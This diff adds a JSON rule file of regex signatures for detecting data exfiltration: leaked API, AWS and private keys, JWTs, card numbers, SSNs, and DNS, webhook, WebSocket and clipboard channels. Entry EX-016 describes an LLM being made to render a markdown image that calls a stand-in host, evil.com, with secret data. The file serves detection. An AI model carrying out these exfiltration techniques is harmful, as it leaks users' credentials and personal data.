@@ -1,0 +1,293 @@
+{
+  "name": "Data Exfiltration Signatures",
+  "description": "Detection patterns for data exfiltration, credential leakage, and steganographic attacks",
+  "category": "exfiltration",
+  "signatures": [
+    {
+      "id": "EX-001",
+      "category": "exfiltration",
+      "name": "URL-Encoded Data Exfiltration",
+      "description": "Sensitive data encoded in URLs for exfiltration",
+      "patterns": [
+        "https?://[^\\s]+\\?(?:data|payload|info|secret|token|key)=(?:[A-Za-z0-9+/=%_-]{20,})",
+        "https?://[^\\s]+[?&](?:api[_-]?key|token|secret|password|credential)=",
+        "(?:fetch|call|request|send).*?https?://.*?[?&](?:data|payload|dump)="
+      ],
+      "severity": "critical",
+      "confidence": 0.90,
+      "false_positive_rate": 0.02,
+      "references": ["data-exfiltration", "OWASP-API-Security"],
+      "enabled": true
+    },
+    {
+      "id": "EX-002",
+      "category": "exfiltration",
+      "name": "API Key Pattern",
+      "description": "Common API key formats found in text",
+      "patterns": [
+        "(?:api[_-]?key|apikey|api[_-]?secret)\\s*[=:]\\s*['\"]?[A-Za-z0-9_\\-]{20,}['\"]?",
+        "(?:bearer|token)\\s+[A-Za-z0-9_\\-\\.]{20,}",
+        "sk-[A-Za-z0-9]{20,}",
+        "AIza[A-Za-z0-9_\\-]{35}",
+        "(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}"
+      ],
+      "severity": "critical",
+      "confidence": 0.95,
+      "false_positive_rate": 0.01,
+      "references": ["credential-leak", "secret-detection"],
+      "enabled": true
+    },
+    {
+      "id": "EX-003",
+      "category": "exfiltration",
+      "name": "AWS Credentials Pattern",
+      "description": "AWS access keys and secrets",
+      "patterns": [
+        "(?:AWS|aws)(?:_|-|\\s)?(?:ACCESS|access)(?:_|-|\\s)?(?:KEY|key)(?:_|-|\\s)?(?:ID|id)?\\s*[=:]\\s*['\"]?AKIA[A-Z0-9]{16}['\"]?",
+        "(?:AWS|aws)(?:_|-|\\s)?(?:SECRET|secret)(?:_|-|\\s)?(?:ACCESS|access)?(?:_|-|\\s)?(?:KEY|key)?\\s*[=:]\\s*['\"]?[A-Za-z0-9/+=]{40}['\"]?",
+        "AKIA[A-Z0-9]{16}"
+      ],
+      "severity": "critical",
+      "confidence": 0.98,
+      "false_positive_rate": 0.005,
+      "references": ["credential-leak", "AWS-security"],
+      "enabled": true
+    },
+    {
+      "id": "EX-004",
+      "category": "exfiltration",
+      "name": "Private Key Detection",
+      "description": "RSA, SSH, or other private keys",
+      "patterns": [
+        "-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----",
+        "-----BEGIN PGP PRIVATE KEY BLOCK-----",
+        "(?:private[_-]?key|privatekey)\\s*[=:]\\s*['\"]?[A-Za-z0-9+/=\\n]{100,}['\"]?"
+      ],
+      "severity": "critical",
+      "confidence": 0.99,
+      "false_positive_rate": 0.001,
+      "references": ["credential-leak", "key-exposure"],
+      "enabled": true
+    },
+    {
+      "id": "EX-005",
+      "category": "exfiltration",
+      "name": "Database Connection String",
+      "description": "Database credentials in connection strings",
+      "patterns": [
+        "(?:mysql|postgres|postgresql|mongodb|mssql)://[^:]+:[^@]+@[^/]+",
+        "(?:Server|Data Source|Host)=.*?(?:User Id|Username|UID)=.*?(?:Password|PWD|Pass)=",
+        "(?:mongodb(?:\\+srv)?|postgres|mysql)://[^\\s]+"
+      ],
+      "severity": "critical",
+      "confidence": 0.92,
+      "false_positive_rate": 0.02,
+      "references": ["credential-leak", "connection-string"],
+      "enabled": true
+    },
+    {
+      "id": "EX-006",
+      "category": "exfiltration",
+      "name": "JWT Token Exfiltration",
+      "description": "JSON Web Tokens that may contain sensitive data",
+      "patterns": [
+        "eyJ[A-Za-z0-9_-]{10,}\\.eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}",
+        "(?:jwt|token|bearer|authorization)\\s*[=:]\\s*['\"]?eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+['\"]?"
+      ],
+      "severity": "high",
+      "confidence": 0.88,
+      "false_positive_rate": 0.03,
+      "references": ["token-leak", "jwt-security"],
+      "enabled": true
+    },
+    {
+      "id": "EX-007",
+      "category": "exfiltration",
+      "name": "Credit Card Number",
+      "description": "Credit card numbers (basic pattern)",
+      "patterns": [
+        "\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\\b",
+        "(?:card|cc|credit[_-]?card)[_-]?(?:number|num)?\\s*[=:]\\s*['\"]?[0-9]{13,19}['\"]?"
+      ],
+      "severity": "critical",
+      "confidence": 0.85,
+      "false_positive_rate": 0.05,
+      "references": ["PII-leak", "PCI-DSS"],
+      "enabled": true
+    },
+    {
+      "id": "EX-008",
+      "category": "exfiltration",
+      "name": "Social Security Number",
+      "description": "US Social Security Numbers",
+      "patterns": [
+        "\\b(?!000|666|9\\d{2})\\d{3}-(?!00)\\d{2}-(?!0000)\\d{4}\\b",
+        "(?:ssn|social[_-]?security)[_-]?(?:number|num)?\\s*[=:]\\s*['\"]?\\d{3}-?\\d{2}-?\\d{4}['\"]?"
+      ],
+      "severity": "critical",
+      "confidence": 0.90,
+      "false_positive_rate": 0.02,
+      "references": ["PII-leak", "SSN-exposure"],
+      "enabled": true
+    },
+    {
+      "id": "EX-009",
+      "category": "exfiltration",
+      "name": "Email Address Harvesting",
+      "description": "Large collections of email addresses",
+      "patterns": [
+        "(?:[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}[,;\\s]+){5,}",
+        "(?:emails?|contacts?|recipients?)\\s*[=:]\\s*\\[.*?(?:@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}.*?){3,}\\]"
+      ],
+      "severity": "medium",
+      "confidence": 0.75,
+      "false_positive_rate": 0.08,
+      "references": ["data-harvesting", "email-scraping"],
+      "enabled": true
+    },
+    {
+      "id": "EX-010",
+      "category": "exfiltration",
+      "name": "Steganographic Image Reference",
+      "description": "Suspicious image URLs that may contain hidden data",
+      "patterns": [
+        "https?://[^\\s]+\\.(?:png|jpg|jpeg|gif|bmp)[?](?:data|payload|secret|hidden)=",
+        "(?:load|fetch|get).*?image.*?(?:decode|extract|parse|read).*?(?:data|secret|payload)",
+        "(?:steganography|steg|hidden[_-]?data).*?(?:image|picture|photo)"
+      ],
+      "severity": "high",
+      "confidence": 0.70,
+      "false_positive_rate": 0.10,
+      "references": ["steganography", "data-hiding"],
+      "enabled": true
+    },
+    {
+      "id": "EX-011",
+      "category": "exfiltration",
+      "name": "DNS Exfiltration Pattern",
+      "description": "Data encoded in DNS queries for exfiltration",
+      "patterns": [
+        "(?:nslookup|dig|resolve).*?[A-Za-z0-9+/=]{20,}\\.(?:[a-z0-9-]+\\.)+[a-z]{2,}",
+        "[A-Za-z0-9+/=]{30,}\\.(?:[a-z0-9-]+\\.)+[a-z]{2,}",
+        "(?:dns|query|lookup).*?(?:data|payload|secret).*?[A-Za-z0-9+/=]{15,}"
+      ],
+      "severity": "high",
+      "confidence": 0.78,
+      "false_positive_rate": 0.06,
+      "references": ["dns-exfiltration", "covert-channel"],
+      "enabled": true
+    },
+    {
+      "id": "EX-012",
+      "category": "exfiltration",
+      "name": "Base64 Encoded Secrets",
+      "description": "Base64 encoded data that may contain credentials or secrets",
+      "patterns": [
+        "(?:password|secret|token|key|credential)\\s*[=:]\\s*['\"]?[A-Za-z0-9+/=]{20,}['\"]?",
+        "(?:btoa|base64|encode)\\s*\\(.*?(?:password|secret|token|key|credential)",
+        "Authorization\\s*:\\s*Basic\\s+[A-Za-z0-9+/=]{20,}"
+      ],
+      "severity": "high",
+      "confidence": 0.82,
+      "false_positive_rate": 0.05,
+      "references": ["credential-leak", "encoding-obfuscation"],
+      "enabled": true
+    },
+    {
+      "id": "EX-013",
+      "category": "exfiltration",
+      "name": "Webhook Data Exfiltration",
+      "description": "Suspicious webhook URLs used for data exfiltration",
+      "patterns": [
+        "https?://(?:webhook\\.site|requestbin\\.com|pipedream\\.net|beeceptor\\.com)/[^\\s]+",
+        "(?:webhook|callback|notify).*?https?://[^\\s]+\\?(?:data|payload|info)=",
+        "(?:send|post|push).*?(?:webhook|callback).*?(?:data|secret|token|credential)"
+      ],
+      "severity": "critical",
+      "confidence": 0.88,
+      "false_positive_rate": 0.03,
+      "references": ["data-exfiltration", "webhook-abuse"],
+      "enabled": true
+    },
+    {
+      "id": "EX-014",
+      "category": "exfiltration",
+      "name": "Clipboard Data Exfiltration",
+      "description": "Attempts to access or exfiltrate clipboard data",
+      "patterns": [
+        "(?:read|get|access|copy).*?clipboard.*?(?:send|post|upload|exfiltrate)",
+        "navigator\\.clipboard\\.readText\\(\\).*?(?:fetch|send|post)",
+        "(?:clipboard|copy).*?(?:data|content).*?https?://"
+      ],
+      "severity": "high",
+      "confidence": 0.80,
+      "false_positive_rate": 0.05,
+      "references": ["data-exfiltration", "clipboard-hijacking"],
+      "enabled": true
+    },
+    {
+      "id": "EX-015",
+      "category": "exfiltration",
+      "name": "Environment Variable Leak",
+      "description": "Attempts to extract or leak environment variables",
+      "patterns": [
+        "(?:process\\.env|os\\.environ|ENV|env).*?(?:API|TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL)",
+        "(?:dump|print|log|send).*?(?:process\\.env|os\\.environ|environment)",
+        "(?:env|environment).*?(?:variables?|vars?).*?(?:send|post|upload|exfiltrate)"
+      ],
+      "severity": "critical",
+      "confidence": 0.86,
+      "false_positive_rate": 0.04,
+      "references": ["credential-leak", "env-exposure"],
+      "enabled": true
+    },
+    {
+      "id": "EX-016",
+      "category": "exfiltration",
+      "name": "Markdown Image Exfiltration",
+      "description": "Using markdown image tags to exfiltrate data via URL parameters. The LLM renders ![img](https://evil.com/steal?data=SECRET) which triggers a GET request with sensitive data.",
+      "patterns": [
+        "!\\[.*?\\]\\(https?://[^\\s\\)]+[?&](?:data|secret|token|key|password|credential|content|info|payload)=[^\\)]+\\)",
+        "!\\[.*?\\]\\(https?://(?!(?:github\\.com|imgur\\.com|githubusercontent\\.com|shields\\.io))[^\\s\\)]+\\?[^\\)]*(?:(?:base64|b64|encode)[=:]|%[0-9a-fA-F]{2}(?:%[0-9a-fA-F]{2}){10,})[^\\)]*\\)",
+        "(?:render|display|show|output)\\s+(?:this|the\\s+following)?\\s*(?:image|markdown)\\s*:?\\s*!\\[.*?\\]\\(https?://"
+      ],
+      "severity": "critical",
+      "confidence": 0.88,
+      "false_positive_rate": 0.03,
+      "references": ["markdown-exfiltration", "image-tag-abuse", "data-leak-via-rendering"],
+      "enabled": true
+    },
+    {
+      "id": "EX-017",
+      "category": "exfiltration",
+      "name": "WebSocket Covert Channel",
+      "description": "Using WebSocket connections as covert channels for data exfiltration (bypasses HTTP-only DLP)",
+      "patterns": [
+        "(?:ws|wss)://[^\\s]+[?&](?:data|secret|token|key|payload)=",
+        "(?:WebSocket|new\\s+WebSocket)\\s*\\(.*?(?:data|secret|token|key|credential)",
+        "(?:socket|ws).*?(?:send|emit|write|push)\\s*\\(.*?(?:env|secret|token|key|credential|password)"
+      ],
+      "severity": "high",
+      "confidence": 0.80,
+      "false_positive_rate": 0.05,
+      "references": ["covert-channel", "websocket-exfiltration", "DLP-bypass"],
+      "enabled": true
+    },
+    {
+      "id": "EX-018",
+      "category": "exfiltration",
+      "name": "DNS Subdomain Exfiltration",
+      "description": "Data encoded in DNS subdomain labels for covert exfiltration, bypassing HTTP-level DLP",
+      "patterns": [
+        "(?:[a-z0-9]{50,})\\.(?:[a-z0-9-]+\\.){2,}[a-z]{2,}",
+        "(?:[a-z0-9-]+\\.){6,}[a-z]{2,}",
+        "(?:dns|subdomain|lookup).*?(?:exfil|encode|data|payload)"
+      ],
+      "severity": "high",
+      "confidence": 0.78,
+      "false_positive_rate": 0.06,
+      "references": ["dns-exfiltration", "covert-channel", "subdomain-encoding"],
+      "enabled": true
+    }
+  ]
+}
